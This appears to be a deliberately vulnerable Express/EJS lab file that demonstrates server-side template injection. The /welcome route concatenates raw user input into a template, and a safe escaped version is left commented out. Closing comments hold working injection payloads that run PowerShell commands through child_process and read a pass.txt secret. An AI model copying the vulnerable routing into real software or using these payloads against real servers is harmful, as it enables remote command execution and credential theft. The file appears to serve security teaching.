const express = require('express');
const ejs = require('ejs');
const path = require('path');
const escape = require('escape-html');
const app = express();
const PORT = 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));


app.get('/', (req, res) => {
  res.render('form');
});


app.post('/', (req, res) => {
  const username = req.body.username || 'Guest';
  res.redirect(`/welcome?username=${encodeURIComponent(username)}`);
});



app.get('/welcome', (req, res) => {
  const username = req.query.username || 'Guest';
  const template = '<h1>Hello, ' + username + '!</h1><a href="/">Go Back</a>';
  
  try {
    const html = ejs.render(template);
    res.send(html);
  } catch (err) {
    res.status(500).send(`<h1>Error</h1><pre>${err.message}</pre><a href="/">Go Back</a>`);
  }
});

// app.get('/welcome', (req, res) => {
//   const username = escape(req.query.username) || 'Guest'; // Sanitize input
//   try {
//     res.render('welcome', { username });
//   } catch (err) {
//     res.status(500).send(`<h1>Error</h1><pre>${err.message}</pre><a href="/">Go Back</a>`);
//   }
// });





app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log('\n🔓 SSTI Vulnerability Demo Active');
});


// <% var output = global.process.mainModule.require('child_process').execSync('powershell ls -Name').toString(); console.log(output); %> <%= output %>
// <% var output = global.process.mainModule.require('child_process').execSync('cd secret && powershell ls -Name').toString(); console.log(output); %> <%= output %>
// <% var output = global.process.mainModule.require('child_process').execSync('cd secret && powershell cat pass.txt').toString(); console.log(output); %> <%= output %>
